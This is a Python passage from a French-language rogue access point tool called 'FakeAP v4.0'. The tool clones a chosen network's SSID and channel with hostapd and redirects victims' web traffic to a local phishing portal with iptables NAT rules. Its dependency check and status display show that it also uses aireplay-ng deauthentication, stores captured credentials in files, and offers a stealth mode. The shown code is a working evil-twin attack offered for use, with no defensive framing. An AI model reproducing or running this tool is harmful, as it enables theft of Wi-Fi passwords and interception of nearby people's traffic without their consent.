    hostapd_conf = f"interface={CURRENT_INTERFACE}\ndriver=nl80211\nssid={SELECTED_SSID}\nchannel={CURRENT_CHANNEL}\nhw_mode=g\nignore_broadcast_ssid=0\nmacaddr_acl=0\nauth_algs=1\n"
    if AP_AUTH_MODE == "wpa2":
        hostapd_conf += f"wpa=2\nwpa_passphrase={AP_WPA_PASS}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
    with open("/tmp/hostapd_fakeap.conf","w") as f: f.write(hostapd_conf)
    proc = subprocess.Popen(["sudo","hostapd","/tmp/hostapd_fakeap.conf"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    _watchdog_procs['ap'] = proc
    time.sleep(3); return proc

def configure_iptables():
    spinner("Configuration NAT / iptables", duration=1.0)
    run_silent("sudo iptables -F"); run_silent("sudo iptables -t nat -F")
    run_silent("sudo sysctl -w net.ipv4.ip_forward=1")
    run_silent(f"sudo iptables -t nat -A PREROUTING -i {CURRENT_INTERFACE} -p tcp --dport 80  -j DNAT --to-destination {CURRENT_GATEWAY}:80")
    run_silent(f"sudo iptables -t nat -A PREROUTING -i {CURRENT_INTERFACE} -p tcp --dport 443 -j DNAT --to-destination {CURRENT_GATEWAY}:80")
    run_silent(f"sudo iptables -A INPUT   -i {CURRENT_INTERFACE} -j ACCEPT")
    run_silent(f"sudo iptables -A FORWARD -i {CURRENT_INTERFACE} -j ACCEPT")

def start_http_server():
    try:
        server = HTTPServer((CURRENT_GATEWAY, 80), PortalHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True); t.start()
        print(f"  {C.OK}Serveur HTTP → {C.CYAN}http://{CURRENT_GATEWAY}{C.END}")
        return server
    except Exception as e:
        print(f"  {C.ALERT}Serveur HTTP: {e}{C.END}"); return None

def check_services():
    ok = True
    if run_silent("pgrep hostapd").returncode != 0:
        print(f"  {C.ALERT}hostapd inactif!{C.END}"); ok = False
    if run_silent("pgrep dnsmasq").returncode != 0:
        print(f"  {C.ALERT}dnsmasq inactif!{C.END}"); ok = False
    return ok

def check_requirements():
    tools = {'aireplay-ng':'aireplay-ng','iw':'iw','dnsmasq':'dnsmasq','hostapd':'hostapd'}
    missing = [t for t,c in tools.items() if run_silent(f"which {c}").returncode != 0]
    if missing:
        print(f"\n  {C.ALERT}Outils manquants:{C.END}")
        for m in missing: print(f"  {C.YELLOW}  •  {m}{C.END}")
        print(f"\n  {C.CYAN}sudo apt update && sudo apt install -y {' '.join(missing)}{C.END}")
        return False
    return True

def cleanup():
    global DEAUTH_RUNNING, WATCHDOG_RUNNING
    print(f"\n  {C.WARN}Nettoyage FakeAP v4.0...{C.END}")
    DEAUTH_RUNNING = False; WATCHDOG_RUNNING = False
    run_silent("sudo pkill -9 dnsmasq"); run_silent("sudo pkill -9 hostapd")
    run_silent("sudo iptables -F"); run_silent("sudo iptables -t nat -F")
    run_silent(f"sudo ip link set {CURRENT_INTERFACE} down")
    run_silent("sudo systemctl start NetworkManager")
    print(f"  {C.OK}FakeAP arrêté proprement.{C.END}")

def signal_handler(sig, frame):
    print(f"\n\n  {C.RED}{C.BOLD}[FakeAP] SIGINT — arrêt...{C.END}")
    cleanup(); show_cursor(); sys.exit(0)

# ═══════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════
def main():
    global SELECTED_PAGE, SELECTED_SSID, SELECTED_FILE, CURRENT_INTERFACE

    boot_sequence(); time.sleep(0.4)

    # Détection multi-interface
    detect_multi_interface()
    CURRENT_INTERFACE = INTERFACE_AP

    print_banner()

    if os.geteuid() != 0:
        print(f"\n  {C.ALERT}Lance avec : {C.YELLOW}sudo python3 FakeAP.py{C.END}\n"); sys.exit(1)

    progress_bar("VÉRIFICATION DÉPENDANCES", total=20, delay=0.03, char_fill='▓', char_empty='░')
    if not check_requirements(): sys.exit(1)

    if not show_menu(): return

    signal.signal(signal.SIGINT, signal_handler)
    LIVE_STATS['start_time'] = time.time()

    try:
        print(); print_section("INITIALISATION FAKEAP v4.0")
        progress_bar("DÉMARRAGE DES SERVICES", total=30, delay=0.05)

        setup_network()
        dns_proc = start_dhcp_dns()
        ap_proc  = start_access_point()
        configure_iptables()
        server   = start_http_server()

        time.sleep(3)
        if not check_services():
            print(f"\n  {C.ALERT}Services en échec!{C.END}"); cleanup(); sys.exit(1)

        # Démarrage watchdog si activé
        if WATCHDOG_RUNNING: start_watchdog()

        # Interface live
        clear_screen(); print_banner()
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"  {C.GREEN}{C.BOLD}{'═'*64}{C.END}")
        typewriter(f"  ● FakeAP v4.0 ACTIF — {now}", color=C.GREEN, delay=0.02)
        print(f"  {C.GREEN}{C.BOLD}{'═'*64}{C.END}\n")
        print(f"  {C.CYAN}SSID         :{C.END}  {C.PURPLE}{C.BOLD}{SELECTED_SSID}{C.END}")
        print(f"  {C.CYAN}PAGE         :{C.END}  {C.YELLOW}{SELECTED_PAGE['name'] if SELECTED_PAGE else 'WiFiToo'}{C.END}")
        print(f"  {C.CYAN}INTERFACE AP :{C.END}  {C.BLUE}{INTERFACE_AP}{C.END}")
        print(f"  {C.CYAN}INTERFACE DX :{C.END}  {C.RED}{INTERFACE_DEAUTH}{C.END}  {C.DIM}({'2 cartes' if DUAL_CARD_MODE else '1 carte'}){C.END}")
        print(f"  {C.CYAN}GATEWAY      :{C.END}  {C.GREEN}{CURRENT_GATEWAY}/{CURRENT_NETMASK}{C.END}")
        print(f"  {C.CYAN}CANAL        :{C.END}  {C.YELLOW}{CURRENT_CHANNEL}{C.END}")
        print(f"  {C.CYAN}MODE AP      :{C.END}  {C.RED if AP_AUTH_MODE=='wpa2' else C.GREEN}{AP_AUTH_MODE.upper()}{C.END}")
        print(f"  {C.CYAN}STEALTH      :{C.END}  {C.GREEN if STEALTH_MODE else C.BLACK}{'ON' if STEALTH_MODE else 'OFF'}{C.END}")
        print(f"  {C.CYAN}WATCHDOG     :{C.END}  {C.GREEN if WATCHDOG_RUNNING else C.BLACK}{'ON' if WATCHDOG_RUNNING else 'OFF'}{C.END}")
        print(f"  {C.CYAN}CAPTURES     :{C.END}  {C.GREEN}{CAPTURES_FILE}{C.END}  +  {C.CYAN}{CSV_FILE}{C.END}")
        print(f"  {C.CYAN}LOG HTTP     :{C.END}  {C.DIM}{HTTP_LOG_FILE}{C.END}")
        print()
        print(f"  {C.GREEN}{'─'*64}{C.END}")
        print(f"  {C.DIM}En attente de connexions...   {C.RED}Ctrl+C pour arrêter{C.END}")
        print(f"  {C.GREEN}{'─'*64}{C.END}\n")

        while True: time.sleep(1)

    except KeyboardInterrupt: pass
    except Exception as e: print(f"\n  {C.ALERT}{e}{C.END}")
    finally: cleanup(); show_cursor()

if __name__ == "__main__":
    main()
